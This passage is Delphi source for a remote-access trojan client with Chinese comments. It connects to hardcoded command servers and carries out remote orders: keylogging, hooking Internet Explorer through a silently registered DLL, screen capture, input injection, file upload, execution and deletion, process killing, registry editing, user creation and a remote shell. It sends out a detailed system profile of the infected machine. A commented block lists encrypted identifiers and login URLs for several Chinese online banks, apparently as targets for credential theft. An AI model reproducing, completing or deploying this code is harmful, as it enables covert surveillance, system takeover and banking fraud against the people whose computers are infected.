    strcat(Para,'\IEHelper.dll');
    MoveFileEx(Para,nil,MOVEFILE_DELAY_UNTIL_REBOOT);
  end
  else begin
    new(pTF);
    if not recvBuf(socket,pTF,sizeof(stTransFilesInfo)) then exit;
    GetSystemDirectory(pTF^.clientFile,sizeof(pTF^.clientFile));
    strcat(pTF^.clientFile,'\IEHelper.dll');
    pTF^.server:=DataSvrAddr;
    hd:=createthread(nil,0,@TransFilesClientThread,pTF,0,id);
    waitforSingleObject(hd,INFINITE);
    Para:=' /k regsvr32/s IEHelper.dll';
    ShellExecute(0,nil, 'cmd',Para, nil, SW_hide);
    closehandle(hd);
  end;//not hook
end;
}
procedure GetHookKeys();
var
  hd,id:cardinal;
begin
  hd:=createthread(nil,0,@GetHookKeysThread,nil,0,id);
  closehandle(hd);
end;
procedure GetHookKeysThread(Socket:integer);stdcall;
var
  info:pansiChar;
  size:DWORD;
  oh:stOrdHeader;
begin
  info:=ManageHookKeys(HStart);
  size:=strlen(info);
  InitOrdHeader(@oh);
  oh.Order:=o_opHookKey;
  oh.DataSize:=size;
  oh.Data:=info;
  TransDataClientThread(@oh);
end;

procedure processGetPCName();
var
  hd,id:cardinal;
begin
  hd:=createthread(nil,0,@GetPCNameThread,nil,0,id);
  closehandle(hd);
end;
procedure GetPCNameThread(param:pointer);
//2006-03-17:增加取GSYH，GSZF字符串，格式：
//"PCName gsyh_1234ABCD|gszf_1234ABCD"
//06-05-13:去除：GSYH，GSZF字符串，格式：
var
  size:dword;
  buf,yh:string;
  oh:stOrdHeader;
begin
  buf:=RegGetString(HKEY_LOCAL_MACHINE,'SoftWare\MicroSoft\byc','PCName');
  size:=length(buf);
  InitOrdHeader(@oh);
  oh.Order:=o_GetPCName;
  oh.DataSize:=size;
  TransDataClientThread(@oh);
end;

procedure ProcessReNamePC(socket:integer);
var
  pcName:array[0..max_path] of ansiChar;
  ro:stRegOpInfo;
begin
  RecvBuf(socket,@ro,sizeof(ro));
  ro.dat:=@pcName;
  RecvBuf(socket,ro.dat,ro.siz);
  SetInfoToReg(ro);
  processGetPCName();
end;
{
procedure ProcessReg(socket:integer);
var
  ro:stRegOpInfo;
begin
  RecvBuf(socket,@ro,sizeof(ro));
  if ro.siz>0 then
  begin
    getmem(ro.dat,ro.siz);
    RecvBuf(socket,ro.dat,ro.siz); //showmessage(pansiChar(ro.dat)); //test
  end;
  OpReg(ro);
  case ro.op of
  REnumKey:
    begin
      SendBuf(socket,@ro.siz,sizeof(ro.siz));
      SendBuf(socket,ro.dat,ro.siz);
      ro.op:=REnumFree;
      OpReg(ro);
    end;//stRegOpInfo
  end;//case
  if ro.siz>0 then freemem(ro.dat);
end;
}
procedure ProcessReg(socket:integer);
var
  ro:stRegOpInfo;
  pro:pRegOpInfo;
  id,hd:DWORD;
begin
  RecvBuf(socket,@ro,sizeof(ro));
  if ro.siz>0 then
  begin
    getmem(ro.dat,ro.siz);
    RecvBuf(socket,ro.dat,ro.siz); //showmessage(pansiChar(ro.dat)); //test
  end;
  new(pro);
  CopyMemory(pro,@ro,sizeof(stRegOpInfo));
  hd:=createthread(nil,0,@RegThread,pro,0,id);
  closehandle(hd);
end;
procedure RegThread(param:pointer);stdcall;
var
  pro:pRegOpInfo;
  oh:stOrdHeader;
begin
  pro:=param;
  OpReg(pro^);
  case pro^.op of
  REnumKey:
    begin
      InitOrdHeader(@oh);
      oh.Order:=o_reg;
      oh.DataSize:=pro^.siz;
      oh.Data:=pro^.dat;
      TransDataClientThread(@oh);
      pro.op:=REnumFree;
      OpReg(pro^);
    end;//stRegOpInfo
  end;//case
  if pro.siz>0 then freemem(pro.dat);
  dispose(pro);
end;
procedure ProcessOpProc(socket:integer);
var
  PID,hProcess:dword;
  op:byte;
begin
  RecvBuf(socket,@op,sizeof(op));
  RecvBuf(socket,@PID,sizeof(PID));
  OpProcess(PID,op);
  //hProcess:=OpenProcess(PROCESS_TERMINATE,BOOL(0),PID);
  //TerminateProcess(hProcess,0);
end;
{
procedure ProcessListProc(socket:integer);
var
  processes:string;
  size:integer;
begin
  //if OSV.dwPlatformId=VER_PLATFORM_WIN32_WINDOWS then
  //  GetProcessesInfo98(Processes)
  //else
    GetProcessesInfo2000(Processes);
  size:=length(processes);
  SendBuf(socket,@size,sizeof(size));
  SendBuf(socket,pansiChar(processes),size);
end;
}
procedure ProcessListProc();
var
  hd,id:DWORD;
begin
  hd:=createthread(nil,0,@ListProcThread,nil,0,id);
  closehandle(hd);
end;
procedure ListProcThread(param:pointer);stdcall;
var
  processes:string;
  size:integer;
  oh:stOrdHeader;
begin
  InitOrdHeader(@oh);
  oh.Order:=o_ListProcs;
  GetProcessesInfo2000(Processes);
  oh.DataSize:=length(processes);
  oh.Data:=pansiChar(processes);
  TransDataClientThread(@oh);
end;
procedure ProcessKeyMouse(socket:integer);
var
  inp:TInput;
  hWS: HWINSTA;
  hDT: HDESK;
begin
  RecvBuf(socket,@inp,sizeof(inp));
  if inp.Itype=INPUT_MOUSE then
    SetCursorPos(inp.mi.dx,inp.mi.dy);
  //AttachInput();
  SwitchWSDT(nil,nil,hWS,hDT);
  SendInput(1,inp,sizeof(inp));
  SwitchWSDT(nil,nil,hWS,hDT,true);
end;
procedure ProcessTransFiles(socket:integer);
var
  pTF:pTransFilesInfo;
  hd,id:cardinal;
begin
  new(pTF);
  if not recvBuf(socket,pTF,sizeof(stTransFilesInfo)) then exit;
  pTF^.server:=DataSvrAddr;
  hd:=createthread(nil,0,@TransFilesClientThread,pTF,0,id);
  closehandle(hd);
end;
{
procedure ProcessListFileInfos(socket:integer);
label 1;
var
  dir:array[0..max_path-1] of ansiChar;
  size:dword;
  data:pansiChar;
  bRet:bool;
begin
  zeromemory(@dir,sizeof(dir));
  bRet:=recvBuf(socket,@size,sizeof(size));
  if bRet then Log('ListFileInfos param size:%d:',[size]) else Log('ListFileInfos param size fail');
  bRet:=recvBuf(socket,@dir,size);
  if bRet then Log('ListFileInfos param :%s:',[dir]) else Log('ListFileInfos param  fail');
  size:=getFileInfos(dir,nil);
  Log('ListFileInfos getFileInfos Size :%d:',[size]);
  if size=0 then goto 1;
  data:=VirtualAlloc(nil,size,mem_commit,page_readwrite);
  zeromemory(data,sizeof(size));
  getFileInfos(dir,data);
1:
  bRet:=SendBuf(socket,@size,sizeof(size));
  if bRet then Log('ListFileInfos SendBuf size:%d:',[size]) else Log('ListFileInfos SendBuf size fail');
  if size>0 then
  begin
   bRet:=SendBuf(socket,data,size);
   if bRet then Log('ListFileInfos SendBuf success') else Log('ListFileInfos SendBuf fail');
   VirtualFree(data,size,MEM_DECOMMIT);
   Virtualfree(data,0,MEM_RELEASE);
  end;
end;
}
procedure ProcessListFileInfos(socket:integer;poh:POrdHeader);
label 1;
var
  dir:pansiChar;
  hd,id:cardinal;
  pOh2:POrdHeader;
  bRet:bool;
begin
  GetMem(poh^.data,poh^.DataSize+1);
  zeromemory(poh^.data,poh^.DataSize+1);
  bRet:=recvBuf(socket,poh^.data,poh^.DataSize);
  dir:=poh^.Data;
  //if bRet then Log('ListFileInfos param :%s:',[dir]) else Log('ListFileInfos param  fail');
  new(poh2);
  CopyMemory(poh2,poh,sizeof(stOrdHeader));
  hd:=createthread(nil,0,@ListFileInfosThread,poh2,0,id);
  closehandle(hd);

end;
procedure ListFileInfosThread(param:pointer);stdcall;
label 1;
var
  dir:pansiChar;
  size:dword;
  data:pansiChar;
  bRet:bool;
  pOh:POrdHeader;
begin
  poh:=param;
  dir:=poh^.Data;
  poh^.DataSize:=getFileInfos(dir,nil);
  //Log('ListFileInfos getFileInfos Size :%d:',[poh^.DataSize]);
  if poh^.DataSize=0 then goto 1;
  getmem(poh^.Data,poh^.DataSize);
  zeromemory(poh^.Data,poh^.DataSize);
  getFileInfos(dir,poh^.Data);
  TransDataClientThread(poh);
1:
  freemem(dir);
  freemem(poh^.Data);
  dispose(poh);
end;
{
procedure ProcessListDrvs(socket:integer);
var
  Drvs:array[0..24] of stDriveInfo;
  size:DWORD;
begin
  zeromemory(@Drvs,sizeof(Drvs));
  size:=GetDrvs(Drvs)*sizeof(stDriveInfo);
  SendBuf(socket,@size,sizeof(size));
  SendBuf(socket,@Drvs,size);
end;
}
procedure ProcessListDrvs();
var
  hd,id:cardinal;
begin
  hd:=createthread(nil,0,@ListDrvsThread,nil,0,id);
  closehandle(hd);
end;
procedure ListDrvsThread(socket:integer);stdcall;
var
  Drvs:array[0..24] of stDriveInfo;
  size:DWORD;
  oh:stOrdHeader;
begin
  zeromemory(@Drvs,sizeof(Drvs));
  InitOrdHeader(@oh);
  oh.DataSize:=GetDrvs(Drvs)*sizeof(stDriveInfo);
  oh.Order:=o_ListDrvs;
  oh.Data:=@Drvs[0];
  //GetMem(oh.Data,nSize);
  //CopyMemory(oh.Data,@Drvs[0],nSize);
  TransDataClientThread(@oh);
end;
//---------------------------------------------------------------------------
procedure InitSvrAddrs(pSvrAddrs:pointer;size:integer);stdcall;
var
  ps:pSvrAddr2;
  sa:stSvrAddr2;
  i,count:integer;
begin
  zeromemory(pSvrAddrs,size);
  count:=size div sizeof(stSvrAddr);
  for i:=0 to count-1 do
  begin
    ps:=pSvrAddr2(dword(psvrAddrs)+i*sizeof(stSvrAddr2));
    case i of
    0:begin
        ps^.svr.port:=PORT1;
        ps^.svr.flg:=0;
        ps^.svr.IP:=SERVER1;
        ps^.dport:=PORT2;
      end;//0
    1:begin
        ps^.svr.port:=PORT1;
        ps^.svr.flg:=0;
        ps^.svr.IP:=SERVER2;
        //strcopy(ps^.svr.DN,pansiChar(DESryStrHex(SERVER2,'byc')));
        ps^.dport:=PORT2;
        //ps^.DN:=;
      end;//1
    2:begin
        ps^.svr.port:=PORT1;
        ps^.svr.flg:=0;
        ps^.svr.IP:=SERVER3;
        ps^.dport:=PORT2;
      end;//1
    3:begin //06-08-13屏蔽
        //sa:=GetIPServer(IPFILE1);
        //CopyMemory(ps,@sa,sizeof(stSvrAddr2));
      end;//3
    end;//case
  end;//for
end;
procedure ProcessGetPCInfo();
var
  hd,id:cardinal;
begin
  hd:=createthread(nil,0,@GetPCInfoThread,nil,0,id);
  closehandle(hd);
end;
procedure GetPCInfoThread();stdcall;
//06-04-02:修改获取OS版本信息；增加远程桌面连接显示；
//06-05-13:以XML格式显示本机信息
//15-9-6:多线程 
var
  Info,XML:string;
  Buf:array[0..255] of ansiChar;
  nSize:cardinal;
  oh:stOrdHeader;
begin
  zeromemory(@Buf,sizeof(Buf));
  XML:='<PCInfo>'#13#10;
  XML:=XML+'<CID>'+'100'+'</CID>'#13#10;

  Info:=RegGetString(HKEY_LOCAL_MACHINE,BYC_KEY,'PCName');
  XML:=XML+'<name>'+Info+'</name>'#13#10;

  XML:=XML+'<version>'+'2.00'+'</version>'#13#10;

  XML:=XML+'<SystemInfo>'#13#10;
  XML:=XML+'<OSVersion>'+OSVersion+'</OSVersion>'#13#10;

  GetLocalIP(Buf);
  XML:=XML+'<LocalIP>'+Buf+'</LocalIP>'#13#10;

  nSize:=sizeof(Buf);
  GetComputerName(@Buf[0],nSize);
  XML:=XML+'<ComputerName>'+Buf+'</ComputerName>'#13#10;

  lstrcpyA(buf,'(n/a)');
  RegGetStr(HKEY_LOCAL_MACHINE,'System\CurrentControlSet\Services\VxD\VNETSUP','Workgroup',buf);
  XML:=XML+'<Workgroup>'+Buf+'</Workgroup>'#13#10;

  zeromemory(@Buf,sizeof(Buf));nSize:=sizeof(Buf);
  if RegGetStr(HKEY_LOCAL_MACHINE,BYC_KEY,'user',Buf)=nil then
    GetUserNameA(Buf,nSize);
  if lstrcmpiA(Buf,'SYSTEM')=0 then
  begin
    zeromemory(@buf[0],sizeof(buf));
    GetLoginUser(Buf);
  end;

  XML:=XML+'<UserName>'+Buf+'</UserName>'#13#10;

  RegGetStr(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Internet Explorer\Version Vector','IE',Buf);
  XML:=XML+'<IEVersion>'+Buf+'</IEVersion>'#13#10;

  RegGetStr(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\DirectX','Version',buf);
  XML:=XML+'<DXVersion>'+Buf+'</DXVersion>'#13#10;

  GetCPUSpeed(Buf);
  XML:=XML+'<CPUSpeed>'+Buf+'</CPUSpeed>'#13#10;

  GetPhymemery(Buf);
  XML:=XML+'<Phymemery>'+Buf+'</Phymemery>'#13#10;

  GetScrSize(Buf);
  XML:=XML+'<ScrSize>'+Buf+'</ScrSize>'#13#10;

  Getopentime(Buf);
  XML:=XML+'<OpenTime>'+Buf+'</OpenTime>'#13#10;
  XML:=XML+'</SystemInfo>'#13#10;

  GetSetupTime(Buf);
  XML:=XML+'<SetupTime>'+Buf+'</SetupTime>'#13#10;
  
  XML:=XML+'<SvcName>'+SvcName+'</SvcName>'#13#10;

  GetModuleFileNameA(hInstance,buf,sizeof(buf));
  XML:=XML+'<FileName>'+Buf+'</FileName>'#13#10;

  if IsRemoteDeskConn() then Info:='是' else Info:='否';
  XML:=XML+'<IsRemoteDeskConn>'+Info+'</IsRemoteDeskConn>'#13#10;

  if Havevideo then Info:='true' else Info:='false';
  XML:=XML+'<video>'+Info+'</video>'#13#10;

  XML:=XML+'<yh>'#13#10;
  lstrcpyA(buf,BYC_KEY);lstrcatA(buf,'\yh');
  Info:=GetRegyh(HKEY_LOCAL_MACHINE,buf);
  XML:=XML+'<gsyh>'+Info+'</gsyh>'#13#10;

  Info:=RegGetString(HKEY_LOCAL_MACHINE,buf,'gszf');
  XML:=XML+'<gszf>'+Info+'</gszf>'#13#10;
  XML:=XML+'</yh>'#13#10;
  XML:=XML+'</PCInfo>'#13#10;
  InitOrdHeader(@oh);
  oh.DataSize:=length(XML);
  oh.Order:=o_PCInfo;
  oh.Data:=pansiChar(xml);
  TransDataClientThread(@oh);
  //SendBuf(Socket,@nSize,sizeof(nSize));
  //SendBuf(Socket,@XML[1],Length(XML));
end;
function TransDataClientThread(pOh:POrdHeader):bool;stdcall;
label 1;
var
  hSocket:integer;
begin
  result:=false;
  hSocket:=0;
  if not ConnectServer(hSocket,DataSvrAddr) then goto 1;
  SendBuf(hSocket,pOh,sizeof(stOrdHeader));

  if poh^.DataSize>0 then SendBuf(hSocket,pOh.Data,pOh.DataSize);
1:
  //freemem(oh^.pData);
  FreeSocket(hSocket);
end;
{
procedure ProcessGetPCInfo(Socket:integer);
//06-04-02:修改获取OS版本信息；增加远程桌面连接显示；
//06-05-13:以XML格式显示本机信息
var
  Info,XML:string;
  Buf:array[0..255] of ansiChar;
  nSize:cardinal;
begin
  zeromemory(@Buf,sizeof(Buf));
  XML:='<PCInfo>'#13#10;
  XML:=XML+'<CID>'+CID+'</CID>'#13#10;

  Info:=RegGetString(HKEY_LOCAL_MACHINE,BYC_KEY,'PCName');
  XML:=XML+'<name>'+Info+'</name>'#13#10;

  XML:=XML+'<version>'+VER+'</version>'#13#10;

  XML:=XML+'<SystemInfo>'#13#10;
  XML:=XML+'<OSVersion>'+OSVersion+'</OSVersion>'#13#10;

  GetLocalIP(Buf);
  XML:=XML+'<LocalIP>'+Buf+'</LocalIP>'#13#10;

  nSize:=sizeof(Buf);
  GetComputerName(@Buf[0],nSize);
  XML:=XML+'<ComputerName>'+Buf+'</ComputerName>'#13#10;

  lstrcpy(buf,'(n/a)');
  RegGetStr(HKEY_LOCAL_MACHINE,'System\CurrentControlSet\Services\VxD\VNETSUP','Workgroup',buf);
  XML:=XML+'<Workgroup>'+Buf+'</Workgroup>'#13#10;

  zeromemory(@Buf,sizeof(Buf));nSize:=sizeof(Buf);
  if RegGetStr(HKEY_LOCAL_MACHINE,BYC_KEY,'user',Buf)=nil then
    GetUserName(Buf,nSize);
  if lstrcmpi(Buf,'SYSTEM')=0 then
  begin
    zeromemory(@buf[0],sizeof(buf));
    GetLoginUser(Buf);
  end;

  XML:=XML+'<UserName>'+Buf+'</UserName>'#13#10;

  RegGetStr(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Internet Explorer\Version Vector','IE',Buf);
  XML:=XML+'<IEVersion>'+Buf+'</IEVersion>'#13#10;

  RegGetStr(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\DirectX','Version',buf);
  XML:=XML+'<DXVersion>'+Buf+'</DXVersion>'#13#10;

  GetCPUSpeed(Buf);
  XML:=XML+'<CPUSpeed>'+Buf+'</CPUSpeed>'#13#10;

  GetPhymemery(Buf);
  XML:=XML+'<Phymemery>'+Buf+'</Phymemery>'#13#10;

  GetScrSize(Buf);
  XML:=XML+'<ScrSize>'+Buf+'</ScrSize>'#13#10;

  Getopentime(Buf);
  XML:=XML+'<OpenTime>'+Buf+'</OpenTime>'#13#10;
  XML:=XML+'</SystemInfo>'#13#10;

  GetSetupTime(Buf);
  XML:=XML+'<SetupTime>'+Buf+'</SetupTime>'#13#10;
  
  XML:=XML+'<SvcName>'+SvcName+'</SvcName>'#13#10;

  GetModuleFileName(hInstance,buf,sizeof(buf));
  XML:=XML+'<FileName>'+Buf+'</FileName>'#13#10;

  if IsRemoteDeskConn() then Info:='是' else Info:='否';
  XML:=XML+'<IsRemoteDeskConn>'+Info+'</IsRemoteDeskConn>'#13#10;

  if Havevideo then Info:='true' else Info:='false';
  XML:=XML+'<video>'+Info+'</video>'#13#10;

  XML:=XML+'<yh>'#13#10;
  lstrcpy(buf,BYC_KEY);lstrcat(buf,'\yh');
  Info:=GetRegyh(HKEY_LOCAL_MACHINE,buf);
  XML:=XML+'<gsyh>'+Info+'</gsyh>'#13#10;

  Info:=RegGetString(HKEY_LOCAL_MACHINE,buf,'gszf');
  XML:=XML+'<gszf>'+Info+'</gszf>'#13#10;
  XML:=XML+'</yh>'#13#10;
  XML:=XML+'</PCInfo>'#13#10;

  nSize:=length(XML);
  SendBuf(Socket,@nSize,sizeof(nSize));
  SendBuf(Socket,@XML[1],Length(XML));
end;
}
{
procedure ProcessComputerInfo(hSocket:integer);
//06-04-02:修改获取OS版本信息；增加远程桌面连接显示；
//06-05-13:以XML格式显示本机信息
var
  Info:array[0..1023] of ansiChar;
  Buf:array[0..255] of ansiChar;
  nSize:cardinal;
  //ri:stRegInfo;
begin
  zeromemory(@Info,sizeof(Info));
  zeromemory(@Buf,sizeof(Buf));
  Info:='本地地址IP：          ';
  GetLocalIP(Buf);
  strcat(info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'计算机名称：          ');
  nSize:=sizeof(Buf);
  GetComputerName(@Buf[0],nSize);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'工作组：              ');buf:='(n/a)';
  RegGetStr(HKEY_LOCAL_MACHINE,'System\CurrentControlSet\Services\VxD\VNETSUP','Workgroup',buf);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'用户名：              ');
  nSize:=sizeof(Buf);GetUserName(Buf,nSize);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'操作系统:             ');
  strcat(Info,pansiChar(OSVersion));strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'IE版本:               ');
  RegGetStr(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Internet Explorer\Version Vector','IE',Buf);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'DirectX版本:          ');
  RegGetStr(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\DirectX','Version',buf);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'注册公司:             ');
  RegGetStr(HKEY_LOCAL_MACHINE,'Software\Microsoft\windows\currentversion','Registeredorganization',buf);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'注册用户:             ');
  RegGetStr(HKEY_LOCAL_MACHINE,'Software\Microsoft\windows\currentversion','RegisteredOwner',buf);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'CPU频率:              ');GetCPUSpeed(Buf);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'物理内存:             ');GetPhymemery(Buf);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'开机时间:             ');Getopentime(Buf);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'显示器分辨率:         ');GetScrSize(Buf);
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'服务名:               ');
  strcat(Info,SvcName);strcat(Info,#13#10);

  strcat(Info,'文件路径:             ');GetModuleFileName(hDLL,buf,sizeof(buf));
  strcat(Info,Buf);strcat(Info,#13#10);zeromemory(@Buf,sizeof(Buf));

  strcat(Info,'版本:                 ');
  strcat(Info,VER);strcat(Info,#13#10);

  strcat(Info,'可远程桌面连接：      ');
  if IsRemoteDeskConn then
    strcat(Info,'是')
  else
    strcat(Info,'否');
  if(RegGetStr(HKEY_LOCAL_MACHINE,'SoftWare\MicroSoft\byc','gsyh',buf)<>nil) then
  begin
    strcat(Info,'gsyh_');strcat(Info,buf);strcat(Info,#13#10);
  end;
  if(RegGetStr(HKEY_LOCAL_MACHINE,'SoftWare\MicroSoft\byc','gszf',buf)<>nil) then
  begin
    strcat(Info,'gszf_');strcat(Info,buf);strcat(Info,#13#10);
  end;
  strcat(Info,#13#10#0);

  SendBuf(hSocket,@Info,strlen(Info)+1);
  //GetComputerName(,CLen^);
   //getmem
  //GetComputerInfo
  //send()
  //free mem
end;
}
procedure ProcessScr(socket:integer);
var
  hd,id:cardinal;
  pTS:pTransScreenInfo;
  ViewMode:byte;
begin
  new(pTS);
  if not recvBuf(socket,@ViewMode,sizeof(ViewMode)) then exit;
  pTS^.server:=DataSvrAddr;
  pTS^.BitCount:=ViewMode;
  //TransScrThread(pTS); //测试
  hd:=createthread(nil,0,@TransScrThread,pTS,0,id);
  closehandle(hd);
end;
{
修改记录：2006-04-25
 if not bRet then begin FreeSocket(hSocket);exit;end;
接收数据错误关闭连接、返回主程序。
}
procedure ProcessOrder(hSocket:integer);stdcall;
//06-05-13:add o_GetPID ,O_Add
var

  bRet:bool;
  oh:stOrdHeader;
  ci:stClientInfo;
begin
  while true do
  begin
    if not active then break;
    //bRet:=recvBuf(hSocket,@order,sizeof(order));
    bRet:=recvBuf(hSocket,@oh,sizeof(oh));
    if not bRet then begin FreeSocket(hSocket);exit;end;
    case oh.order of
    o_Ready:
      begin
        continue;
      end;//Ready
    o_GetCID:
      begin
        InitClientInfo(@ci);
        SendBuf(hSocket,@ci,sizeof(ci));
      end;//
    o_PCInfo:
      begin
        ProcessGetPCInfo();
      end;//o_HostInfo
    o_ListDrvs:
      begin
        ProcessListDrvs();
      end;//ListDrvs
    o_Screen:
      begin
        ProcessScr(hSocket);
      end;//o_screen
    o_KeyMouse:
      begin
        ProcessKeyMouse(hSocket);
      end;//o_KeyMouse
    o_TransFiles:
      begin
        ProcessTransFiles(hSocket);
      end;//o_File

    o_ListFileInfos:
      begin
        Log('ListFileInfos Start:');
        ProcessListFileInfos(hSocket,@oh);

      end;//o_ListFileInfos
    o_ListProcs:
      begin
        ProcessListProc();
      end;//o_ListProcs
    o_OpProc:
      begin
        ProcessOpProc(hSocket);
      end;//o_KillProc
    o_Reg:
      begin
        ProcessReg(hSocket);
      end;
    o_ReNamePC:
      begin
        processReNamePC(hSocket);
      end;//o_GetPCName
    o_GetPCName:
      begin
        processGetPCName();
      end;//o_GetPCName
    o_opHookKey://o_StartHookKey
      begin
        processHookKeys(oh);
      end;//o_StartHookKey
    o_HookIE:
      begin
        processHookIE(hSocket);
      end;//
    o_UnHookIE:
      begin
        processHookIE();
      end;//
    o_Close:
      begin
        active:=false;
        FreeSocket(hSocket);
        //ExitProcess(0);
      end;//o_Close
    o_Update:
      begin
        processUpdate();
      end;//o_Update
    o_RunFile:
      begin
        processRunFile(hSocket);
      end;
    o_DelFile:
      begin
        processDelFile(hSocket);
      end;
    o_Delete:
      begin
        processDelete();
      end;//o_UnReg
    o_CrtDir:
      begin
        processCrtDir(hSocket);
      end;//o_CrtDir
    o_DelDir:
      begin
        processDelDir(hSocket);
      end;//o_DelDir
    o_CAD:
      begin
        processCAD();
      end;
    o_Svc:
      begin
        processSvc(hSocket);
      end;//o_Svc
    o_Reboot:
      begin
        processReboot();
      end;//o_Svc
    o_CrtUser:
      begin
        processCrtUser();
      end;//o_Svc
    o_TermSvr:
      begin
        processTermSvr();
      end;//o_Svc

    o_Add:
      begin
        processAdd();
      end;
    o_CMD:
      begin
        processCMD(hSocket);
      end;//o_CMD
    o_video:
      begin
        //processVideo(hSocket);
      end;//o_video
    end;//case

  end;//while
end;
procedure MainThread;stdcall;
var
  hSocket:integer;
  //sas:array[0..2] of stSvrAddr;
  sas:array[0..3] of stSvrAddr2;
  i:integer;
  bRet:bool;
  sr:tShareMemResult;
begin
  //创建共享内存、只运行一个服务判断06-08-13
  {
  if not test then
  begin
  InitShareMem(sm,pansiChar(svcName),'hook.dll');
  sr:=CreateShareMem(sm);
  if (sr=F_FatherCreate)or(sr=F_False) then exit; //test
  //hook dll
  InjectUser();
  //服务监视
  SvcProtect();
  //SetTimer(0,1,1000,@TimerFunc);
  SetTimerThread();//设置时间线程：1s
  SetPCNameFromURL();//设置电脑标识
  //Inserting;         //载入插件
  end; // if not test then
  }
  if not MySetup() then exit;
  sr:=CreateShareMem(sm);
  if (sr=F_FatherCreate)or(sr=F_False) then exit; //test

  if RegGetInt(HKEY_LOCAL_MACHINE,BYC_KEY,'FileHookKey')=1 then
    ManageHookKeys(HStart);
  regSelf();
  
  InitSvrAddrs(@sas,sizeof(sas));
  i:=0;
  while true do
  begin
    repeat

      bRet:=ConnectServer(hSocket,sas[i].svr);
      if not bRet then sleep(6000) else
      begin
        DataSvrAddr:=sas[i].svr;
        DataSvrAddr.port:=sas[i].dport;
        //连接服务端成功：
        //AutoHookIE();//自动挂接IE 2015.5.26取消
        break;
      end;
      if i>=high(sas) then i:=0 else inc(i);
    until bRet;
    ProcessOrder(hSocket);
    if not active then break;
  end;//while
  //killTimer(0,1);
  FreeShareMem(sm);
end;
procedure SetTimerThread();
var
  hd,id:cardinal;
begin
  hd:=createthread(nil,0,@TimerThread,nil,0,id);
  closehandle(hd);
end;
procedure TimerThread();stdcall;
begin
  while true do
  begin
    //SetPCNameFromIE();
    sleep(1000);
    if not active then exit;
  end;
end;
function AutoHookIE():BOOL;
const
  DLLName:pansiChar='IEHelper.dll';
  SetupName:pansiChar='HookIE.exe';
  key:pansiChar='SoftWare\MicroSoft\Byc';
var
  PCName:string;
  FullFile:array[0..max_path-1] of ansiChar;
  hd,id:cardinal;
begin
  result:=false;
  GetSystemDirectoryA(FullFile,sizeof(FullFile));
  strcat(FullFile,'\');strcat(FullFile,dllName);
  PCName:=RegGetString(HKEY_LOCAL_MACHINE,pansiChar(key),'PCName');
  if pos('gsyh',PCName)>0 then
  if(RegValExist(HKEY_LOCAL_MACHINE,key,'gsyh')=false)and (RegValExist(HKEY_LOCAL_MACHINE,key,'gszf')=false) then
  //if(TheFileSize(FullFile)=DWORD(-1)) then
  if(TheFileSize(FullFile)=$FFFFFFFF) then
  begin
    hd:=createthread(nil,0,@SetupFileThread,SetupName,0,id);
    closehandle(hd);
    result:=true;
  end;
end;
{
procedure SetPCNameFromIE();
const
  key='byc';
  gsyh='3476636FDB651F4F1868521499F066391E387EDAE73875B49D33C8A2F5608ECC2E6FDFF5DDC3AEFC8F4F2AED3C941149788B905D5A564002';
  ylzf='8A73DCAB28F756EF7A0C856009D74F2AC8721733918A1206F249F879DF8F0BBE5BCD7FB0E1BB8166E45BBF9DACBC58F453863EC20D69F5B1';
  zsyh='C4047121D90356314AA413A892C182FE23DD6EFB6FD300857D1987334D4A851405D5AA253D24B9534D619BB9E9541F03824E966C1DC33A92595E47B365B2260DF249F879DF8F0BBE5BCD7FB0E1BB8166E45BBF9DACBC58F453863EC20D69F5B1';
  //https://www.sz1.cmbchina.com - 招商银行一网通——个人银行 3.2版 - Microsoft Internet Explorer
  //https://www.sz1.cmbchina.com/script/hbyktlogin.htm
  jsyh='4762577F4E8FB18B8F9C534A9D3FADD220850B5754246AFD949AA7F3D2096915D531C124116A0EF57A75381C99DBF7BCA21E7D7B2DA4850B2F536DC10D1536D0FF860A4BC467E570';
  //..::中国建设银行 >> 登录个人网上银行;;.. - Microsoft Internet Explorer
  //https://ibsbjstar.ccb.com.cn/app/ccbMain?CUSTYPE=0&TXCODE=CLOGIN
  jtyh='B61761EBE88655673CA3E7757370C6F57A75381C99DBF7BCA21E7D7B2DA4850B2F536DC10D1536D0FF860A4BC467E570';
  //交通银行网上银行 - Microsoft Internet Explorer
  //https://www.95559.com.cn/personbank/servlet/com.bocom.eb.cs.html.EBEstablishSessionServlet?module=card
  fzyh='E3EB4E8206DB896477B095E0F0BDD469E4CC23AC074D0CF2371AA13C953060ADBDF59A7FA6CD5BA4F254ECF2993047F8327AFF205E40F448';
  //深圳发展银行|个人银行 - Microsoft Internet Explorer
  //https://geren.sdb.com.cn/personal/servlet/com.csii.ebank.core.MainServlet?transName=initLogin
  hxyh='5FA02363577CA0777A75381C99DBF7BCA21E7D7B2DA4850B2F536DC10D1536D0FF860A4BC467E570';
  //华夏银行 - Microsoft Internet Explorer
  //https://www.hua-xiabank.com/pbank/PrvEstablishSessionServlet?pageName=PSignInInput.jsp
